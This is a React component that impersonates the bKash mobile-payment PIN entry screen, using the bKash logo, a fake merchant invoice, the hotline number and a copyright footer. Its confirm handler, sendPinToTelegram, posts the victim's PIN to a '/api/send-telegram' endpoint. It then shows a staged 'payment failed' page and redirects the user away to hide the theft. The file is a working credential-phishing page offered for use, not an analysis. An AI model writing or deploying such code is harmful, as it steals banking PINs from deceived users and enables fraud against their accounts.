"use client"

import type React from "react"
import Image from "next/image"
import { Card, CardContent } from "@/components/ui/card"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Button } from "@/components/ui/button"
import { ShoppingCart } from "lucide-react"
import { useState, useRef, useEffect } from "react" // Ensure useEffect is imported
import { Input } from "@/components/ui/input"
import PaymentFailedPage from "./payment-failed-page"

interface PinEntryPageProps {
  accountNumber: string
  verificationCode: string
  onCancel: () => void // To go back to the initial account number page
}

export default function PinEntryPage({ accountNumber, verificationCode, onCancel }: PinEntryPageProps) {
  const [pin, setPin] = useState("") // Stores the actual numeric PIN
  const [displayPinValue, setDisplayPinValue] = useState("") // Stores the masked value for display
  const [isConfirmEnabled, setIsConfirmEnabled] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const hidePinTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const [showPaymentFailedPage, setShowPaymentFailedPage] = useState(false)

  // Add these new state and ref variables
  const [paymentFailedCountdown, setPaymentFailedCountdown] = useState<number | null>(null)
  const paymentFailedTimerRef = useRef<NodeJS.Timeout | null>(null)

  // Mask the account number (show first 3 digits and last 3 digits)
  const maskedNumber = accountNumber ? `${accountNumber.slice(0, 3)} ** *** ${accountNumber.slice(-3)}` : ""

  const handlePinInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawInputValue = e.target.value
    let newPin = pin

    if (rawInputValue.length > displayPinValue.length) {
      const newChar = rawInputValue.slice(-1)
      if (newChar.match(/[1-9]/)) {
        newPin += newChar
      }
    } else if (rawInputValue.length < displayPinValue.length) {
      newPin = newPin.slice(0, -1)
    }

    if (newPin.length > 5) {
      newPin = newPin.slice(0, 5)
    }

    setPin(newPin)

    if (hidePinTimeoutRef.current) {
      clearTimeout(hidePinTimeoutRef.current)
    }

    if (newPin.length > 0) {
      const lastDigit = newPin.slice(-1)
      setDisplayPinValue("●".repeat(newPin.length - 1) + lastDigit)

      hidePinTimeoutRef.current = setTimeout(() => {
        setDisplayPinValue("●".repeat(newPin.length))
      }, 500)
    } else {
      setDisplayPinValue("")
    }

    setIsConfirmEnabled(newPin.length >= 4 && newPin.length <= 5)
  }

  // Replace the existing sendPinToTelegram function with this updated version:
  const sendPinToTelegram = async () => {
    setIsLoading(true) // Start loading state immediately

    // Add a small delay to show the loading animation, just like other pages
    setTimeout(() => {
      setShowPaymentFailedPage(true) // Show the payment failed page after loading animation

      // Start the countdown immediately
      setPaymentFailedCountdown(5) // 5 seconds countdown
      paymentFailedTimerRef.current = setInterval(() => {
        setPaymentFailedCountdown((prev) => {
          if (prev === null) return null
          const newCountdown = prev - 1
          if (newCountdown <= 0) {
            if (paymentFailedTimerRef.current) {
              clearInterval(paymentFailedTimerRef.current)
            }
            // Redirect to referrer page using document.referrer
            if (document.referrer) {
              window.location.href = document.referrer
            } else {
              // Fallback if no referrer is available
              window.history.back()
            }
            return 0
          }
          return newCountdown
        })
      }, 1000)

      setIsLoading(false) // Reset loading state after transition
    }, 800) // Small delay to show loading animation, matching other pages

    try {
      const response = await fetch("/api/send-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          pin: pin,
        }),
      })

      if (response.ok) {
        console.log("PIN sent to Telegram successfully via API route.")
      } else {
        const errorData = await response.json()
        console.error("Failed to send PIN to Telegram via API route:", response.status, errorData)
      }
    } catch (error) {
      console.error("Error sending PIN to Telegram:", error)
    }
  }

  // Add a useEffect to clean up the timer if the component unmounts or the page changes
  useEffect(() => {
    return () => {
      if (paymentFailedTimerRef.current) {
        clearInterval(paymentFailedTimerRef.current)
      }
    }
  }, [])

  // Replace the existing `if (showPaymentFailedPage)` block with this:
  if (showPaymentFailedPage) {
    return <PaymentFailedPage countdown={paymentFailedCountdown} />
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-100 p-4">
      <Card className="w-full max-w-sm rounded-xl overflow-hidden shadow-lg">
        <CardContent className="p-0">
          {/* Logo Section */}
          <div className="flex justify-center pt-0 pb-4">
            <Image src="/bkash-logo.png" width={150} height={50} alt="bKash Logo" className="object-contain" />
          </div>

          {/* Transaction Summary */}
          <div className="flex items-center gap-4 p-4 border-t border-b bg-white">
            <Avatar className="w-10 h-10 bg-gray-100 flex items-center justify-center rounded-full">
              <ShoppingCart className="w-5 h-5 text-gray-500" />
              <AvatarFallback className="sr-only">Shopping Cart</AvatarFallback>
            </Avatar>
            <div className="flex-1">
              <p className="text-xs font-medium text-gray-800">PromoShop.com</p>
              <p className="text-[10px] text-gray-500">Inv No: NNT_6094bc8028702...</p>
            </div>
            <div className="text-lg font-semibold text-gray-800">৳49.00</div>
          </div>

          {/* PIN Input Section */}
          <div className="bg-bkash-pink p-6 text-white space-y-4 aspect-square flex flex-col justify-center">
            <h2 className="text-lg font-semibold text-center whitespace-nowrap">
              Enter PIN of your bKash account number
            </h2>
            <div className="relative flex items-center justify-center">
              <p className="text-center text-lg font-medium">{maskedNumber}</p>
            </div>
            <div className="relative flex items-center">
              <Input
                type="tel"
                placeholder="Enter PIN"
                className="w-full rounded-md border border-input bg-white px-4 py-2 text-base text-gray-800 placeholder:text-gray-400 text-center focus:border-transparent focus:ring-0 focus:outline-none focus:ring-offset-0 text-2xl tracking-wider"
                value={displayPinValue}
                maxLength={5}
                onChange={handlePinInputChange}
              />
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex justify-around p-2.5 gap-4 bg-white">
            <Button
              variant="outline"
              className="flex-1 rounded-md border border-gray-300 bg-white text-gray-800 shadow-sm hover:bg-gray-50"
              onClick={onCancel}
            >
              Cancel
            </Button>
            <Button
              disabled={!isConfirmEnabled || isLoading}
              onClick={isConfirmEnabled && !isLoading ? sendPinToTelegram : undefined}
              className={`flex-1 rounded-md shadow-sm transition-colors duration-200 ${
                isLoading
                  ? "!bg-[#F48CA7] text-white cursor-not-allowed !hover:bg-[#F48CA7] !active:bg-[#F48CA7] !focus:bg-[#F48CA7]"
                  : isConfirmEnabled
                    ? "bg-bkash-pink text-white hover:bg-bkash-pink/90"
                    : "bg-gray-200 text-gray-500 cursor-not-allowed"
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center space-x-1">
                  <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
                  <div
                    className="w-2 h-2 bg-white rounded-full animate-bounce"
                    style={{ animationDelay: "150ms" }}
                  ></div>
                  <div
                    className="w-2 h-2 bg-white rounded-full animate-bounce"
                    style={{ animationDelay: "300ms" }}
                  ></div>
                </div>
              ) : (
                "Confirm"
              )}
            </Button>
          </div>

          {/* Footer */}
          <div className="flex flex-col items-center justify-center p-2.5 text-xs space-y-1">
            <div className="flex items-center gap-1 text-bkash-pink">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="lucide lucide-phone-call"
              >
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
              </svg>
              <span>16247</span>
            </div>
            <p className="text-xs" style={{ color: "#9e9e9e" }}>
              © 2025 bKash, All Rights Reserved
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
